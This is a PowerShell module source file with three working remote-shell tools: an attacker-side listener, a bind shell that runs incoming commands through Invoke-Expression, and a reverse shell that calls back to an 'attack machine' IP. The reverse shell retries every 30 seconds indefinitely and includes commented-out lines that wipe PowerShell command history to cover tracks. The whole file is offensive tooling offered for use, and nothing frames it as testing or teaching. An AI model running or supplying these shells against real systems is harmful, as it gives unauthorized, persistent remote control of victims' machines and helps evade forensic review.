# Start-Listener
<#
.SYNOPSIS
    This cmdlet is for creating a listener that a reverse shell can attach too.


.DESCRIPTION
    Open a listner port to connect to from a target machine.


.SYNTAX
    Start-Listener -Port <int32>


.PARAMETER
    -Port
        This parameter is for defining the listening port to connect too.


.EXAMPLE
    Start-Listener -Port 1234

    This examples connects to a listener on port 1234.
#>
Function Start-Listener {
[CmdletBinding()]
    param(
        [Parameter(
            Mandatory=$True,
            Position=0,
            ValueFromPipeline=$False,
            HelpMessage='Enter a port to listen on. Valid ports are between 1 and 65535. Example: 1234'
            )] # End Parameter
        [ValidateRange(1,65535)]
        [int32]$Port
    ) # End param

        Write-Host ("Listening on [0.0.0.0] (port " + $Port + ")") -ForegroundColor 'Green'

        $Socket = New-Object -TypeName System.Net.Sockets.TcpListener('0.0.0.0', $Port);

        If($Socket -eq $Null)
        {

            Exit

        } # End If

      $Socket.Start()

      $Client = $Socket.AcceptTcpClient()

      Write-Host "[*] Connection Established." -ForegroundColor 'Green'

      $Stream = $Client.GetStream()

      $Writer = New-Object -TypeName System.IO.StreamWriter($Stream)
      $Buffer = New-Object -TypeName System.Byte[] 2048
      $Encoding = New-Object -TypeName System.Text.AsciiEncoding

      Do
      {

          $Command = Read-Host

          $Writer.WriteLine($Command)

          $Writer.Flush();

          If($Command -eq "exit")
          {

              Break

          } # End If

          $Read = $Null

          While($Stream.DataAvailable -or $Read -eq $Null)
          {

              $Read = $Stream.Read($Buffer, 0, 2048)

              $Out = $Encoding.GetString($Buffer, 0, $Read)

              Write-Output $Out

          } # End While

      } While ($Client.Connected -eq $True) # End Do While Loop

      $Socket.Stop()

      $Client.Close()

      $Stream.Dispose()

}  # End Function Start-Listener

# Start-Bind
<#
.SYNOPSIS
    This cmdlet is for attaching PowerShell to a port that listens for a connection aka Creating a bind shell.


.DESCRIPTION
    Open a Bind Shell that attaches to PowerShell and listens on a port that you define.


.SYNTAX
    Start-Bind -Port <int32>


.PARAMETER
    -Port
        This parameter is for defining the listening port that PowerShell should attach too


.EXAMPLE
    Start-Bind -Port 1234

    This examples creates a listener on port 1234 and attaches PowerShell to it.
#>
Function Start-Bind {
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$True,
                Position=1,
                ValueFromPipeline=$False,
                HelpMessage='Enter a port to listen on. Valid ports are between 1 and 65535. Example: 1234')] # End Parameter
            [ValidateRange(1,65535)]
            [int32]$Port
        )  # End param

        $Listener = [System.Net.Sockets.TcpListener]$Port
        $Listener.Start()
        $Client = $Listener.AcceptTcpClient()

        $Stream = $Client.GetStream()

       [byte[]]$Bytes = 0..65535 | ForEach-Object -Process { 0 }
       $SendBytes = ([text.encoding]::ASCII).GetBytes("Logged into PowerShell as " + $env:USERNAME + " on " + $env:COMPUTERNAME + "`n`n")

       $Stream.Write($SendBytes,0,$SendBytes.Length)
       $SendBytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
       $Stream.Write($SendBytes,0,$SendBytes.Length)

       While(($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
       {
                   $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
                   $Data = $EncodedText.GetString($Bytes, 0, $i)

                   Try
                   {

                       $SendBack = (Invoke-Expression -Command $Data 2>&1 | Out-String )

                   }  # End Try
                   Catch
                   {

                       Write-Host "Failure occured attempting to execute the command on target." -ForegroundColor 'Red'

                       $Error[0]

                   }  # End Catch

                   $SendBack2  = $SendBack + 'PS ' + (Get-Location | Select-Object -Property 'Path') + '> '
                   $x = ($Error[0] | Out-String)
                   $Error.clear()
                   $SendBack2 = $SendBack2 + $x

                   $SendByte = ([text.encoding]::ASCII).GetBytes($SendBack2)
                   $Stream.Write($SendByte, 0, $SendByte.Length)
                   $Stream.Flush()
        }  # End While

        $Client.Close()
        $Listener.Stop()

}  # End Function Start-Bind

<#
.SYNOPSIS
    This cmdlet is for connecting PowerShell to a listening port on a target machine.


.DESCRIPTION
    Connect to a lsitening port on a remote machine.


.SYNTAX
    Invoke-ReversePowerShell -IpAddress <string> -Port <int32>


.PARAMETER
    -IpAddress
        This parameter is for defining the ip address of the device that is listening for a connection.

.PARAMETER
    -Port
        This parameter is for defining the listening port on a remote machine.


.EXAMPLE
    Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1234

    This examples connects to 192.168.2.1 on port 1234
#>
Function Invoke-ReversePowerShell {
    [CmdletBinding()]
        param(
            [Parameter(
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName = $True,
                HelpMessage="Enter the IP Address of your attack machine. Example: 10.10.14.21"
            )] # End Parameter
            [ValidateNotNullorEmpty()]
            [IPAddress]$IpAddress,

            [Parameter(
                Mandatory=$True,
                Position=1,
                ValueFromPipeline=$False,
                HelpMessage="Enter the port number your attack machine is listening on. Example: 1234"
            )] # End Parameter
                [ValidateNotNullorEmpty()]
                [ValidateRange(1,65535)]
            [int32]$Port
        ) # End param

    $GodsMakeRules = "They dont follow them"

    While ($GodsMakeRules -eq 'They dont follow them')
    {

        $ErrorActionPreference = 'Continue'

        Try
        {

            Write-Host "Connection attempted. Check your listener." -ForegroundColor 'Green'

            $Client = New-Object System.Net.Sockets.TCPClient($IpAddress,$Port)

            $Stream = $Client.GetStream()

            [byte[]]$Bytes = 0..255 | ForEach-Object -Process {0}

            $SendBytes = ([Text.Encoding]::ASCII).GetBytes("Welcome $env:USERNAME, you are now connected to $env:COMPUTERNAME "+"`n`n" + "PS " + (Get-Location).Path + "> ")

            $Stream.Write($SendBytes,0,$SendBytes.Length);$Stream.Flush()

            While(($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
            {
                $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $i)

                If($Command.StartsWith("kill-link"))
                {

                    Clear-Host

                    Write-Information "If you wish to clear your command history when exiting shell uncomment the below lines"
                    # Clear-History
                    # Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
                    $Client.Close()
                    Exit
                } # End If
                Try
                {
                    # Executes commands
                    $ExecuteCmd = Invoke-Expression -Command $Command -ErrorAction SilentlyContinue | Out-String
                    $ExecuteCmdAgain  = $ExecuteCmd + "PS " + (Get-Location).Path + "> "
                } # End Try
                Catch
                {
                    $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
                    $ExecuteCmdAgain  =  "ERROR: " + $Error[0].ToString() + "`n`n" + "PS " + (Get-Location).Path + "> "
                    Clear-Host
                } # End Catch
                $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($ExecuteCmdAgain)
                $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
                $Stream.Flush()
            } # End While
        } # End Try
        Catch
        {

            Write-Host "There was an initial connection error. Retrying in 30 seconds..." -ForegroundColor 'Red'
            If($Client.Connected)
            {

                Write-Information "If you wish to clear your command history when exiting shell uncomment the below lines"
                # Clear-History
                # Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force

                $Client.Close()

            } # End If

            Clear-Host

            Write-Information "If you wish to clear your command history when exiting shell uncomment the below lines"
            # Clear-History
            # Clear-Content -Path ((Get-PSReadlineOption).HistorySavePath) -Force
            Start-Sleep -Seconds 30
        } # End Catch
    } # End While
} # End Function Invoke-ReversePowerShell
